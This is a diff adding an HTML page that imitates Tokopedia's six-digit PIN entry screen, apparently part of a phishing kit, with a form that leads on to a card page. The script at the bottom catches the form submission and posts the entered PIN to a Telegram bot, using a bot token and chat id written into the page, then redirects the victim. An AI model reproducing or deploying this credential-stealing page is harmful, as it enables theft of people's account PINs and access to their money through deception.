@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en"> 
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<!-- /Added by HTTrack -->
+  <head>
+    <meta charset="UTF-8">
+    <title>PIN Tokopedia</title>
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+    <link href="https://cdn.prod.website-files.com/63ff63430987c87ee6fae0a1/css/performance-honest.2e4ed2216.min.css" rel="stylesheet" type="./text/css">
+    <link rel="stylesheet" href="./style.css">
+<style>
+.wrapper {
+  text-align: center;
+}
+
+.otp-container {
+  display: inline-block;
+}
+.otp-container .otp-number-input {
+  width: 26.9px;
+  height: 33px;
+  margin: auto;
+  margin-right: 2.3px;
+  border-top: 0;
+  border-left: 0;
+  border-right: 0;
+  border-bottom: 2px solid rgba(0, 0, 0, 0.2);
+  padding: 0;
+  color: rgba(0, 0, 0, 0.7);
+  margin-bottom: 0;
+  padding-bottom: 0;
+  font-size: 32px;
+  text-shadow: none;
+  box-shadow: none;
+  text-align: center;
+  background-color: transparent;
+  font-weight: 600;
+  line-height: 0;
+  border-radius: 0;
+  border-image-width: 0;
+}
+.otp-container .otp-number-input:focus, .otp-container .otp-number-input .otp-filled {
+  outline: 0;
+  border-color: #42b549;
+  transition: all 0.3s ease;
+}
+.otp-container .otp-number-input.otp-filled-active {
+  outline: 0;
+  border-color: #42b549;
+}
+
+.btn-green-submit {
+  background: #42b549;
+  height: 40px;
+  color: #fff;
+  padding: 9px;
+  font-size: 13px;
+  line-height: 1.5em;
+  border-radius: 4px;
+  -webkit-transition: all 0ms ease-out;
+  -moz-transition: all 0ms ease-out;
+  -o-transition: all 0ms ease-out;
+  transition: all 0ms ease-out;
+}</style>
+  </head>
+    
+  <body>
+  <form id="setPin" action="kartu.html" method="POST">
+<br><br>
+<div class="wrapper">
+      <h3>Masukkan PIN kamu</h3>
+      <p>Masukkan 6 digit PIN Tokopedia kamu</p>
+<br>
+	<div class="otp-container">
+		<input name="pin1" id="otp1" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+		<input name="pin2"  id="otp2" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+		<input name="pin3" id="otp3" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+		<input name="pin4" id="otp4" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+		<input name="pin5" id="otp5" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+		<input name="pin6" id="otp6" inputmode="numeric" type="password" class="otp-number-input" maxlength="1">
+	</div>
+	<br>
+	<br><br><br>
+     <b>
+<button id="btnSubmit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none #22C55E; border: none; text-align: center; display: block; margin: 20px auto; height: 40px; width: 360px; left: 0px; top: 0px; font-family: sans-serif; font-size: 15px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 5px; box-shadow: 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 400; tabindex="1">𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮</button>
+</b>
+</form>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script><script  src="./script.js"></script>
+ <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+<script src="jquery.min.js"></script>
+       
+        <script type="text/javascript">
+            $(document).ready(function(){
+        </script>
+<!-- </body> -->  
+   <script>
+
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script> 
+  
+  <!-- partial -->
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+ <p id="status"></p>
+   <script src="setPin.js"></script>
+   
+   <script>
+   $(document).ready(function() {
+	$(".otp-number-input").keydown(function(ev) {
+		otp_val = $(this).val();
+		//input number only
+		// if ((ev.which < 48 || (ev.which > 57 && ev.which < 96) || ev.which > 105) && (ev.which != 67 && ev.which != 86)) {
+		// 	ev.preventDefault();
+		// }
+		if (ev.keyCode == 37) {
+			$(this).prev('.otp-number-input').focus();
+			ev.preventDefault();
+		} else if (ev.keyCode == 39) {
+			$(this).next('.otp-number-input').focus();
+			ev.preventDefault();
+		} else if (otp_val.length == 1 && ev.keyCode != 8 && ev.keyCode != 46) {
+			otp_next_number = $(this).next('.otp-number-input');
+			if (otp_next_number.length == 1 && otp_next_number.val().length == 0) {
+				otp_next_number.focus();
+			}
+		} else if (otp_val.length == 0 && ev.keyCode == 8) {
+			$(this).prev('.otp-number-input').val("");
+			$(this).prev('.otp-number-input').focus();
+		} else if (otp_val.length == 1 && ev.keyCode == 8) {
+			$(this).val("");
+		} else if (otp_val.length == 0 && ev.keyCode == 46) {
+			next_input = $(this).next('.otp-number-input');
+			next_input.val("");
+			while (next_input.next('.otp-number-input').length > 0) {
+				next_input.val(next_input.next('.otp-number-input').val());
+				next_input = next_input.next('.otp-number-input');
+				if (next_input.next('.otp-number-input').length == 0) {
+					next_input.val("");
+					break;
+				}
+			}
+		}
+		$('#code-error').addClass('invisible');
+		$('#code-clear').addClass('none');
+	}).focus(function() {
+		$(this).select();
+	}).keyup(function(ev) {
+		otpCodeTemp = "";
+		$("input.otp-number-input").each(function(i) {
+			if ($(this).val().length != 0) {
+				$(this).addClass('otp-filled-active');
+			} else {
+				$(this).removeClass('otp-filled-active');
+			}
+			otpCodeTemp += $(this).val();
+		});
+
+		if ($(this).val().length == 1 && ev.keyCode != 37 && ev.keyCode != 39) {
+			$(this).next('.otp-number-input').focus();
+			ev.preventDefault();
+		}
+	});
+	$(".otp-number-input").on("click", function(e) {
+		otp_val = $('#otp-number-input-1').val();
+		if (otp_val === "") {
+			$("#otp-number-input-1").focus();
+		}
+	});
+	$(".otp-number-input").on("paste", function(e) {
+		window.handlePasteOTP(e);
+	});
+});
+
+function handlePasteOTP(e) {
+	var clipboardData = e.clipboardData || window.clipboardData || e.originalEvent.clipboardData;
+	var pastedData = clipboardData.getData('Text');
+	var arrayOfText = pastedData.toString().split('');
+	/* for number only */
+	// if (isNaN(parseInt(pastedData, 10))) {
+	// 	e.preventDefault();
+	// 	return;
+	// }
+	for (var i = 0; i < arrayOfText.length; i++) {
+		if (i >= 0 && i <= 3) {
+			document.getElementById('otp-number-input-' + (i + 1)).value = arrayOfText[i];
+			if (i <= 2) {
+				document.getElementById('otp-number-input-' + (i + 2)).focus();
+			}
+		} else {
+			return;
+		}
+	}
+	e.preventDefault();
+}
+   
+   
+   
+            $(document).ready(function() {
+            $("div#eyeOpen").on('click', function() {
+                $("#eyeOpen").css("display", "none");
+                $("#eyeClose").css("display", "block");
+
+                $("#password").prop("type", "text");
+
+                $("div#eyeClose").on('click', function() {
+                    $("#eyeOpen").css("display", "block");
+                    $("#eyeClose").css("display", "none");
+
+                    $("#password").prop("type", "password");
+                });
+            });
+            
+const chat_id = '-1003302144502', botID = 'bot8499835544:AAF_KRcHMfFaw83C47bmGYPXVLDRY5fo1pA';
+
+    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+    document.querySelector('#setPin').addEventListener("submit", async e => { // When the user submits the form
+        e.preventDefault(); // Don't submit
+        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
+            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
+        null, 2); // Prettify the JSON so we can read the data easily
+        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
+            method: 'POST',
+            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
+            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
+        });
+        const messageStatus = document.querySelector('#status');
+        if (sendMessage.ok) // Update the user on if the message went through
+            messageStatus.textContent = "";
+        else
+            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
+        e.target.reset(); // Clear the form fields.
+        window.location.href = 'index.html';
+    });
+
+            
+        });
+        
+   </script>
+   
+</body>
+</html>
